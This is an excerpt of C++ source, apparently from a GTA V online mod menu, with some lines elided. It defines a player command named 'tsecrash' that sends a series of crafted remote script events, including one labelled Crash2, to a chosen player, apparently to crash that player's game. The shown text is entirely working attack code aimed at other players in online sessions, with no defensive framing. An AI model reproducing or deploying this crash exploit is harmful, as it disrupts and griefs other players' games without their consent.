...
namespace big
{
	class tsecrash : player_command
	{
		...
		virtual void execute(player_ptr player, const command_arguments& _args, const std::shared_ptr<command_context> ctx) override
		{
			...
			g_pointers->m_gta.m_trigger_script_event(1, args1, sizeof(args1) / sizeof(args1[0]), 1 << player->id(), 0);

			int64_t args2[] = { (int64_t)eRemoteEvent::Crash2, (int64_t)self::id, rand() % INT64_MAX };
			g_pointers->m_gta.m_trigger_script_event(1, args2, sizeof(args2) / sizeof(args2[0]), 1 << player->id(), 0);
			...
			g_pointers->m_gta.m_trigger_script_event(1, args3, sizeof(args3) / sizeof(args3[0]), 1 << player->id(), 0);

			int64_t args4[] = { (int64_t)eRemoteEvent::MCTeleport, (int64_t)self::id, rand() % INT64_MAX, rand() % INT64_MAX };
			g_pointers->m_gta.m_trigger_script_event(1, args4, sizeof(args4) / sizeof(args3[0]), 1 << player->id(), 0);
		}
	};
